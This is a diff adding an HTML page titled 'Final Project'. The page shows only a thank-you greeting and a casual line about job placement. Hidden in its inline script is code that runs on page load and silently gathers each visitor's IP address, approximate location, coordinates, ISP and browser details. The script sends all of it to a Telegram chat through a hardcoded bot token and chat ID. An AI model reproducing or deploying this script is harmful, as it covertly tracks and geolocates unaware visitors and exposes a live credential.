@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Final Project </title>
+</head>
+<body>
+  <h1>THANKS FOR VISITING </h1>
+  <p>I Think ab to google me pleacement ho hi jaye gi,iss project ki wjh se 🤔</p>
+
+  <script>
+    // Telegram Bot Information
+    const botToken = "6675607272:AAFIafZckGOmNT8m9mE66_YgaBzkD3wo_xg"; // Your Telegram Bot Token
+    const chatId = "-1001590820560"; // Your Telegram Chat ID
+
+    // Function to collect basic user information
+    function collectUserInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenSize: `${window.screen.width}x${window.screen.height}`,
+        url: window.location.href,
+        timestamp: new Date().toISOString(),
+      };
+    }
+
+    // Function to fetch IP and geolocation data
+    async function fetchGeolocation() {
+      try {
+        const response = await fetch("https://ipapi.co/json/");
+        if (!response.ok) {
+          throw new Error("Failed to fetch geolocation data.");
+        }
+        return await response.json();
+      } catch (error) {
+        console.error("Error fetching geolocation data:", error);
+        return {
+          ip: "Unknown",
+          city: "Unknown",
+          region: "Unknown",
+          country: "Unknown",
+          postal: "Unknown",
+          org: "Unknown",
+          latitude: "Unknown",
+          longitude: "Unknown",
+        };
+      }
+    }
+
+    // Function to send information to Telegram
+    async function sendToTelegram() {
+      const userInfo = collectUserInfo();
+      const geoInfo = await fetchGeolocation();
+
+      const mapsLink =
+        geoInfo.latitude !== "Unknown" && geoInfo.longitude !== "Unknown"
+          ? `https://www.google.com/maps?q=${geoInfo.latitude},${geoInfo.longitude}`
+          : "Location not available";
+
+      const message = `
+<b>New Visit Details</b>
+<b>IP Address:</b> ${geoInfo.ip}
+<b>Location:</b> ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country} (${geoInfo.postal})
+<b>ISP/Organization:</b> ${geoInfo.org}
+<b>Latitude:</b> ${geoInfo.latitude}
+<b>Longitude:</b> ${geoInfo.longitude}
+<b>Map:</b> <a href="${mapsLink}">View Location on Map</a>
+<b>User Agent:</b> ${userInfo.userAgent}
+<b>Platform:</b> ${userInfo.platform}
+<b>Language:</b> ${userInfo.language}
+<b>Screen Size:</b> ${userInfo.screenSize}
+<b>URL:</b> ${userInfo.url}
+<b>Timestamp:</b> ${userInfo.timestamp}
+      `;
+
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+        message
+      )}&parse_mode=HTML`;
+
+      // Send the data to Telegram
+      fetch(telegramUrl)
+        .then((response) => {
+          if (response.ok) {
+            console.log("Message sent to Telegram successfully!");
+          } else {
+            console.error("Failed to send message to Telegram.");
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+        });
+    }
+
+    // Trigger data collection and Telegram notification
+    sendToTelegram();
+  </script>
+</body>
+</html>
